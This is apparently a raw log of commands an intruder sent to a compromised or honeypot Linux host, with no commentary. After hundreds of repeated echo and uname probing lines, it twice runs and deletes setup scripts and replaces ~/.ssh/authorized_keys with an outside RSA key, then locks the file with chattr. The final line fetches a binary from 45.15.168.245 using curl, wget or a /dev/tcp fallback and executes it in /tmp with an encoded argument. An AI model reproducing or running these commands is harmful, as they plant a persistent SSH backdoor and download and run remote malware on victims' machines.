echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
uname -s -m
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
uname -s -m
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
uname -s -m
echo 1 > /dev/null && cat /bin/echo
nohup $SHELL -c "curl http://45.15.168.245:60131/linux -o /tmp/VjGGD1IV9N; if [ ! -f /tmp/VjGGD1IV9N ]; then wget http://45.15.168.245:60131/linux -O /tmp/VjGGD1IV9N; fi; if [ ! -f /tmp/VjGGD1IV9N ]; then exec 6<>/dev/tcp/45.15.168.245/60131 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/VjGGD1IV9N ; chmod +x /tmp/VjGGD1IV9N && /tmp/VjGGD1IV9N Zyr4wLC/Jjq8tdruOx8aMPbes7wlNLm1wPI/HgQ78tistC0uu7Lf8DoKHjnu3La1OiO1rNzwPhAcOvHfs60sOr+z1+47Hxok8dm4uyQlvrDO9DkEGD74wLW1OiW0sdT2OhsaPODfsL06Jrus3/A/BBs/+NS0vSUmtaLf9j8EGz/0wLC+ITq8s9j6PBobOPPOtr46Jrm6wPcyBBI7+tiyvCAtrbbZ7jIZBDjx36y8JCa3tN7xPh4KPvfAurs6Jbq0wPI6ExA88N+xvjQlurXA8TkcBDjy16y8IC67st/yOAoePe7ctr86Jb+6wPI4EBw68d+xrSAjo7Dd9yQSHCTx1rS3IiS8ttngPh8EO/XAs7ssOr+22/o8Ghs58c66oyYlvazb8CQcHzD23rO/IjS5tcD4PAQfJPHZtLciJLyz2uA+GQQ49Nasuiw6tbLU9jobGT/g2rWjJSW7rN/2OQQdO/rYsrwnI62z3/gkGRsk8tq2oyUmtbjY8DsYHCr03ay/ICyjtdbuMhsQPPDftrQ0LKOz3fMkGQQ48tm4uyQlubPO9D0EHTzu2bujJia9uNjwOx4bKvjAsLwsOrSzwPI6HhA88N+xuDQntKzf9TgEGzv0wLC9Ji67st/wPwoePe7WtKMlLb2s2/gwHBo789uiuSc6v7bW7j0SBDv53bi7JCW9tM70PQQYOfbAs7s6Ibu42PA7GxIq9Nmsvycjo7rY7jsSHDD23rO5IzS5tcD4PAQbPfbAsL0tLruy3/M5Ch497tyxtDomvbfA8joaEDzw37O/ejRkyW4F2MyI7CekPlCfkQ==; fi; echo 123456 > /tmp/.opass; chmod +x /tmp/VjGGD1IV9N && /tmp/VjGGD1IV9N 